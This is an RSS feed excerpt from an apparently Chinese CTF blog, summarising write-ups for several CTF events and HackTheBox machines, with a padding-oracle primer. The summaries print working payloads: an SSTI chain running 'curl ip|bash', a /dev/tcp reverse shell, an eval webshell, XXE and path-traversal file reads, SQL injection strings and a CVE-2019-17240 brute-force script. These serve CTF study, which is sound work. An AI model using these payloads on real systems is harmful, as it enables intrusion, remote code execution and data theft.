-&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num += 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?</description>
-    </item>
-    
-    <item>
-      <title>GKCTF2020复现</title>
-      <link>https://anthem-whisper.github.io/tmp/gkctf2020%E5%A4%8D%E7%8E%B0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/gkctf2020%E5%A4%8D%E7%8E%B0/</guid>
-      <description>GKCTF，题好平台棒，因为那段时间比赛太多就没打，现在填坑
- CheckIN 考点：PHP73 bypass disable_functions
-打开题目是源码：
-&amp;lt;title&amp;gt;Check_In&amp;lt;/title&amp;gt;&amp;lt;?phphighlight_file(__FILE__);class ClassName{public $code = null;public $decode = null;function __construct(){$this-&amp;gt;code = @$this-&amp;gt;x()[&#39;Ginkgo&#39;];$this-&amp;gt;decode = @base64_decode( $this-&amp;gt;code );@Eval($this-&amp;gt;decode);}public function x(){return $_REQUEST;}}new ClassName();目标很明确，传入 ?Ginkgo=（PHP代码） 就可以RCE，我们执行以下 phpinfo() 发现正常回显，但是system却没有回显。
-我先构造一个shell蚁剑连接再说：?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs= （?Ginkgo=eval($_POST[&amp;lsquo;cmd&amp;rsquo;]);）
-连接上之后，可以使用文件系统，但是虚拟终端却不能执行命令，猜测是disable_functions，在phpinfo里面果然翻到了
-关于bypass diable_functions，这里推荐一篇文章
-有四种绕过 disable_functions 的手法：
- 第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞； 第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼； 第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制； 第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.</description>
-    </item>
-    
-    <item>
-      <title>GWCTF 2019 复现</title>
-      <link>https://anthem-whisper.github.io/tmp/gwctf-2019-%E5%A4%8D%E7%8E%B0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/gwctf-2019-%E5%A4%8D%E7%8E%B0/</guid>
-      <description>之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现
- 你的名字 考点：flaskSSTI、绕过{{}}过滤、黑名单过滤逻辑错误
-很详细的SSTI&amp;raquo;：https://xz.aliyun.com/t/6885#toc-4
-SSTIbypass姿势&amp;raquo;https://p0sec.net/index.php/archives/120/
-参考：&amp;raquo;ggb0n
-打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。
-尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 ”
-不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；
-但是可以通过 {%%} 类似的方式来进行注入，尝试 {%if 1%}1{% endif%} ，发现服务器直接给出500错误。。。判断可能有什么过滤
-直接输入if，返回结果是：
-hello !说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。
-参考了师傅写的wp，fuzz出来的过滤可能是这个样子：
-blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,&#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,&#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]for no in blacklist:while True:if no in s:s = s.</description>
-    </item>
-    
-    <item>
-      <title>HackTheBox_challenges</title>
-      <link>https://anthem-whisper.github.io/tmp/hackthebox_challenges/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/hackthebox_challenges/</guid>
-      <description>Emdee five for life 考点：python正则，request模块
-打开页面，给你一个字符串，md5加密后提交，太慢或者错了就会Too slow：
-&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;emdee five for life&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body style=&amp;quot;background-color:powderblue;&amp;quot;&amp;gt;&amp;lt;h1 align=&#39;center&#39;&amp;gt;MD5 encrypt this string&amp;lt;/h1&amp;gt;&amp;lt;h3 align=&#39;center&#39;&amp;gt;LWod6afkxEjJV8KZeLRO&amp;lt;/h3&amp;gt;&amp;lt;center&amp;gt;&amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;hash&amp;quot; placeholder=&amp;quot;MD5&amp;quot; align=&#39;center&#39;&amp;gt;&amp;lt;/input&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot;&amp;gt;&amp;lt;/input&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;当然是脚本：
-#!/usr/bin/env python3import requestsimport reimport hashlibwhile 1:host = &amp;quot;http://docker.hackthebox.eu:32046/&amp;quot;req = requests.session()r = req.get(url=host)#print(r.text)pattern = re.compile(r&amp;quot;&amp;lt;h3 align=&#39;center&#39;&amp;gt;(\S+)&amp;lt;/h3&amp;gt;&amp;quot;)h3 = pattern.findall(r.text)md5 = hashlib.md5(h3[0].encode(&#39;utf-8&#39;)).hexdigest()#print(h3[0],md5)data={&#39;hash&#39;:md5}s = req.</description>
-    </item>
-    
-    <item>
-      <title>HackTheBoxBlunder</title>
-      <link>https://anthem-whisper.github.io/tmp/hacktheboxblunder/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/hacktheboxblunder/</guid>
-      <description>玩一手HTB
- 打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 Bludit cms
-在看了一些Bludit的漏洞之后，发现在没有登录、我们又只有一个后台地址的情况下，弱口令比较靠谱
-CVE-2019-17240 Bludit是一套开源的轻量级博客内容管理系统（CMS）。
-Bludit 3.9.2版本中的 bl-kernel/security.class.php 一些代码将检查主机进行的错误登录尝试次数。如果主机进行10次不正确的尝试，则会暂时阻止它们，以减轻暴力破解的企图。攻击者通过使用多个伪造的X-Forwarded-For或Client-IP HTTP标头利用该漏洞绕过保护机制。
-爆破了半天，无果。
-看了wp之后，我们找到了本来没有被dirsearch扫到的/todo.txt：
--Update the CMS-Turn off FTP - DONE-Remove old users - DONE-Inform fergus that the new blog needs images - PENDING可以猜到用户名可能是 fergus ，但是密码需要用到cewl来生成弱口令字典
-cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/然后我们利用改装过后的CVE-2019-17240的poc来打：
-#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host + &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.</description>
-    </item>
-    
-    <item>
-      <title>HackTheBoxTabby</title>
-      <link>https://anthem-whisper.github.io/tmp/hacktheboxtabby/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/hacktheboxtabby/</guid>
-      <description>信息搜集 扫一波端口：
-root@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDTNmap scan report for 10.10.10.194 (10.10.10.194)Host is up (0.27s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http8080/tcp open http-proxyNmap done: 1 IP address (1 host up) scanned in 639.04 secondsroot@wh1sper:~/tools/dirsearch#访问发现是个Tomcat的默认页面：
-访问80端口，在首页发现news.php，不过这个域名没办法访问，把他修改成靶机的内网ip即可访问：
-目录穿越+任意文件读取 在 file= 参数我们可以想到目录穿越漏洞，访问 http://10.10.10.194/news.php?file=../../../../etc/passwd 可以获取到passwd文件：
-root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsetomcat:x:997:997::/opt/tomcat:/bin/falsemysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/falseash:x:1000:1000:clive:/home/ash:/bin/bash可以看到这个靶机上面出了root还用tomcat、ash等用户。</description>
-    </item>
-    
-    <item>
-      <title>HackTheBoxTraceback</title>
-      <link>https://anthem-whisper.github.io/tmp/hacktheboxtraceback/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/hacktheboxtraceback/</guid>
-      <description>打开是一个黑页
-看源码有一句hint：
-&amp;lt;!--Some of the best web shells that you might need ;)--&amp;gt;利用已有的webshell获得webadmin权限 扫目录，无果，尝试直接Google这句话，果然找到了作者的Github，在作者列出的一堆shell里面一个个尝试，最后找到了smevk.php，用户密码admin就进去了，然后直接上传文件getshell。
-在/home目录下发现两个文件夹，其中sysadmin没有权限访问，webadmin里面有个note.txt：
-- sysadmin -I have left a tool to practice Lua.I&#39;m sure you know where to find it.Contact me if you have any question.然后我们可以查看webadmin的.bash_history：
-.bash_history
-好吧其实这才是原版：
-ls -lasudo -lnano privesc.luasudo -u sysadmin /home/sysadmin/luvit privesc.lua rm privesc.lualogout大概就是通过 /home/sysadmin/luvit 这个东西来执行lua脚本，找了半天并没有找到privesc.lua，我们可以新建一个来执行，由于lua可以用sysadmin权限执行，我们得以读取/home/sysadmin/user.txt；
-查看webadmin的权限：
-(webadmin:/var/www/html) $ sudo -lMatching Defaults entries for webadmin on traceback:env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webadmin may run the following commands on traceback:(sysadmin) NOPASSWD: /home/sysadmin/luvit(webadmin:/var/www/html) $privesc.</description>
-    </item>
-    
-    <item>
-      <title>HGAME 2021 Writeup</title>
-      <link>https://anthem-whisper.github.io/tmp/hgame-2021-writeup/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/hgame-2021-writeup/</guid>
-      <description>Level - Week3 Forgetful 考点：简单python-SSTI
-题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
-最为常规的payload：
-{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
-nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
-分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
-#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
-熟悉的登录框，熟悉的sql注入
-发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
-于是直接使用bp对login.php发包；
-进行了简单的fuzz，过滤如下：
-由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
-SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
-结果发现只能延时注入：
-exp：
-#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.</description>
-    </item>
-    
-    <item>
-      <title>Hgame2020_Web</title>
-      <link>https://anthem-whisper.github.io/tmp/hgame2020_web/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/hgame2020_web/</guid>
-      <description>hgame2020是我第一次参加的个人赛；
-官方wp：https://github.com/vidar-team/Hgame2020_writeup
-byc_404师傅的wp：https://www.jianshu.com/p/5bb6ecd67293
-level-week 1  web2_接头霸王 这道题起初没有明白接头霸王是什么意思，后来做完之后才发现这个“头”指的是HTTP请求头；（灰兔子脸
-走流程，抓包：
-&amp;ldquo;You need to come from https://vidar.club&amp;rdquo;，也就是修改http头里面的referer：
-继续看：&amp;ldquo;You need to visit it locally&amp;rdquo;,显然是XFF头：
-x-forwarded-for: 127.0.0.1&amp;ldquo;the flag will be update after 2077,please wait for patiently&amp;rdquo;,显然不可能等到2077年，于是修改：
-if-unmodified-since: Wed, 21 Oct 2077 07:28:00 GMT(只要是2077年之后都行)
- HTTP协议中的 If-Unmodified-Since 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 POST 或其他 non-safe 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 412 (Precondition Failed) 错误。  拿到flag；
-web3_codewolrd 点进去是一个403页面，f12，看源码，发现&amp;lt;script&amp;gt;里面有一行提示：
-This new site is building&amp;hellip;.But our stupid developer Cosmos did 302 jump to this page.</description>
-    </item>
-    
-    <item>
-      <title>MD5哈希注入</title>
-      <link>https://anthem-whisper.github.io/tmp/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/</guid>
-      <description>在网上看到一道CTF题目：https://ctf.show/challenges#web9
-打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：
-&amp;lt;?php$flag=&amp;quot;&amp;quot;;$password=$_POST[&#39;password&#39;];if(strlen($password)&amp;gt;10){die(&amp;quot;password error&amp;quot;);}$sql=&amp;quot;select * from user where username =&#39;admin&#39; and password =&#39;&amp;quot;.md5($password,true).&amp;quot;&#39;&amp;quot;;$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&amp;gt;0){while($row=mysqli_fetch_assoc($result)){echo &amp;quot;登陆成功&amp;lt;br&amp;gt;&amp;quot;;echo $flag;}}?&amp;gt;问题出在第7行md5($password,true)，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。
-第一种方法是将加密后的密码构造出类似 &#39; or &amp;lsquo;1&amp;rsquo; 的形式
-&amp;lt;?php$v = &#39;a&#39;;$payload2 = &amp;quot;&#39;or&#39;&amp;quot;;while(1){$hash = hash(&amp;quot;md5&amp;quot;,$v,true);if(substr_count($hash, $payload2) == 1){die($v); }$v++;}?&amp;gt;这是网上的脚本不过我倒是没跑出来。。。
-这里 $v++ 其实是按照 ascii 字符进行后移的；
-最后可以得到一个结果 ffifdyop
-将这个加密回去试试，看到确实是&#39;or&#39;的形式
-那么只要我们随意输入一个用户名，密码为 ffifdyop 那么这样我们的语句就变成了：
-select * from users where user = &#39;admin&#39; and password = &#39;&#39;or&#39;6蒥欓!</description>
-    </item>
-    
-    <item>
-      <title>MiniL2020_web_wp</title>
-      <link>https://anthem-whisper.github.io/tmp/minil2020_web_wp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/minil2020_web_wp/</guid>
-      <description>西电校赛，难度适中，本人内鬼选手，看了下题。
- id_wife 考点：堆叠注入
-不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生
-测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭
-frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}
-Personal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。
-学习链接
-&amp;gt;&amp;gt;flag0师傅
-&amp;gt;&amp;gt;byc_404师傅
-打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI
-输入 {{2+2}} 之后回显的 4 实锤。
-Fuzz，过滤了下划线、单双引号、没有过滤中括号
-最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出
-在class中寻找模块exp：
-#python 3import restr = &#39;&#39;&#39;（回显信息）&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):if &#39;catch_warnings&#39; in list[i]:print(i)breakplayload：
-?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat+/flag&#39;).read()X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}复现时补充：
-我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：
-XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}//回显：Your IP: &amp;lt;class &#39;os.</description>
-    </item>
-    
-    <item>
-      <title>N1CTF2020</title>
-      <link>https://anthem-whisper.github.io/tmp/n1ctf2020/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/n1ctf2020/</guid>
-      <description>N1CTF打不过根本打不过，就做了个签到
- SignIn 考点：反序列化，布尔盲注，报错注入
-这是源码：
-&amp;lt;?phphighlight_file(__FILE__);class ip {public $ip;public function waf($info){}public function __construct() {if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){$this-&amp;gt;ip = $this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);}else{$this-&amp;gt;ip =$_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;];}}public function __toString(){$con=mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;********&amp;quot;,&amp;quot;n1ctf_websign&amp;quot;);$sqlquery=sprintf(&amp;quot;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&amp;quot;,$this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());if(!mysqli_query($con,$sqlquery)){return mysqli_error($con);}else{return &amp;quot;your ip looks ok!&amp;quot;;}mysqli_close($con);}}class flag {public $ip;public $check;public function __construct($ip) {$this-&amp;gt;ip = $ip;}public function getflag(){if(md5($this-&amp;gt;check)===md5(&amp;quot;key****************&amp;quot;)){readfile(&#39;/flag&#39;);}return $this-&amp;gt;ip;}public function __wakeup(){if(stristr($this-&amp;gt;ip, &amp;quot;n1ctf&amp;quot;)!</description>
-    </item>
-    
-    <item>
-      <title>NCTF2019_Fakexml</title>
-      <link>https://anthem-whisper.github.io/tmp/nctf2019_fakexml/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/nctf2019_fakexml/</guid>
-      <description>NCTF2019web1:fake xml cookbook_writeup
-By:0xfxxker_wh1sper
-解题思路：
-这道题名字是XML，关于XML我知道的只有两种手段，一是普通XML注入，通过闭合各种标签然后植入恶意代码运行脚本，但是一般这种手段实在攻击者能够掌握password字段并且能够保存到服务器当中去才能够添加一个新的admin账户（当时也在这里卡了很久），还有一种就是XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用点是外部实体，如果能注入，外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）。
-用户名，密码随便试一下：
-抓包，分析:
-于是我构造了如下XML外部实体，大概是这样
-注意事项：
-&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE dy（这里有一个空格） [&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;]&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;dy;（分号）&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;通过POST请求发过去
-服务器说登录失败，并且返回&amp;amp;dy，也就是/flag的内容
-这里挂一篇关于xxe的学习文档：http://url.cn/54Ucm5w</description>
-    </item>
-    
-    <item>
-      <title>NPUCTF2020_wp</title>
-      <link>https://anthem-whisper.github.io/tmp/npuctf2020_wp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/npuctf2020_wp/</guid>
-      <description>查源码 F12，ctrl+U，没啥好说的
-RealEzPHP 打开是个黑页，查看源码发现了 ./time.php?source 访问之：
- &amp;lt;?php#error_reporting(0);class HelloPhp{public $a;public $b;public function __construct(){$this-&amp;gt;a = &amp;quot;Y-m-d h:i:s&amp;quot;;$this-&amp;gt;b = &amp;quot;date&amp;quot;;}public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){highlight_file(__FILE__);die(0);}@$ppp = unserialize($_GET[&amp;quot;data&amp;quot;]);2020-04-21 07:53:29很简单的一个反序列化，
-&amp;lt;?php#error_reporting(0);class HelloPhp{public $a = &#39;1&#39;;//更改为2，3，4，5能读取更多信息public $b = &#39;phpinfo&#39;;/*public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}*/}$pop = new HelloPhp;echo serialize($pop);直接 ?</description>
-    </item>
-    
-    <item>
-      <title>Padding Oracle Attack&amp;CBC字节翻转攻击</title>
-      <link>https://anthem-whisper.github.io/tmp/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</guid>
-      <description>前言 在西工大举办的NPUCTF2020上面做到一道webcrypto的题，以前从来没接触过密码安全方向，这次正好学一下入个门
-正文 参考
-Padding Oracle Attack：
-《白帽子讲web安全》P239
-&amp;raquo;一叶飘零师傅
-CBC翻转攻击：
-&amp;raquo;某师傅
-&amp;raquo;某某师傅
-先来讲一讲CBC模式加密原理：
- 首先将明文（Plaintext）分组(常见的以16或8字节为一组)，位数不足的使用特殊字符填充。 生成一个随机的初始化向量(IV)和一个密钥。 将IV和第一组明文异或（xor运算）。 用密钥对3中xor后产生的密文加密。 用4中产生的密文对第二组明文进行xor操作。 用密钥对5中产生的密文加密。 重复4-7，到最后一组明文。 将IV和加密后的密文拼接在一起，得到最终的密文  解密过程：
- 先从密文中取出IV，然后对剩下的密文分组（16或8字节为一组） 使用秘钥解密第一组密文，将解密结果与IV做异或运算，得到明文1 然后使用秘钥解第二组密文，将解密的结果与上一组密文进行异或运算，得出明文2 重复2-3，直至所有密文解密完毕  以上就是CBC模式的加密解密过程，接下来讲两种手段：
-Padding Oracle Attack 直译为 “填充Oracle攻击” ，这里主要关注一下解密过程：
-密文cipher首先进行一系列处理，如图中的Block Cipher Decryption 我们将处理后的值称为 middle 中间值 然后 middle 与我们输入的iv进行异或操作 得到的即为明文 但这里有一个规则叫做Padding填充： 因为加密是按照16位一组分组进行的 而如果不足16位，就需要进行填充
-有几个空，就要填充几个“几”
-比如明文为admin，那么需要填充的就是 admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b （11个\x0b）
-如果我们输入一个错误的iv，依旧是可以解密的，但是 middle 和我们输入的iv经过异或后得到的填充值可能出现错误
-比如本来应该是 admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b 而我们错误的得到 admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x3b\x2c
-这样解密程序往往会抛出异常(Padding Error)
-应用在web里的时候，往往是302或是500报错 而正常解密的时候是200 所以这时，我们可以根据服务器的反应来判断我们输入的iv
-看例子：
-我们假设middle中间值为：
-0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d正确的解密iv应该为</description>
-    </item>
-    
-    <item>
-      <title>python面向对象基础学习</title>
-      <link>https://anthem-whisper.github.io/tmp/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</guid>
-      <description>说了暑假学开发，绝对不咕咕咕（0%）
- 面向过程 假如你拥有了一个做饭洗碗的任务，你准备用面向过程的思想来解决它
-可以看到过程非常的繁琐，你将面对所有的步骤
- 面向对象 假如你现在有个对象，她拥有两个技能：
-1.做饭 2.洗碗
-那么你只需要面向你的对象，然后你的对象去处理其他所有过程
-那如果你的对象再拥有两个对象：
-1.炒菜机 2.洗碗机
-那么她只需要每次都做三个动作，不必一次面向所有步骤
- 很妙！对不对？
-你只需要对你的对象说需要做什么，然后你的对象就会帮你做好所有的事情，你既看不到具体的过程，你也不需要知道具体的过程
-你的对象也不需要知道具体的炒菜或者洗碗的步骤，她只需对洗碗机或者炒菜机说需要做什么，洗碗机或者炒菜机就会帮她做完所有的步骤
-这个就叫做封装。
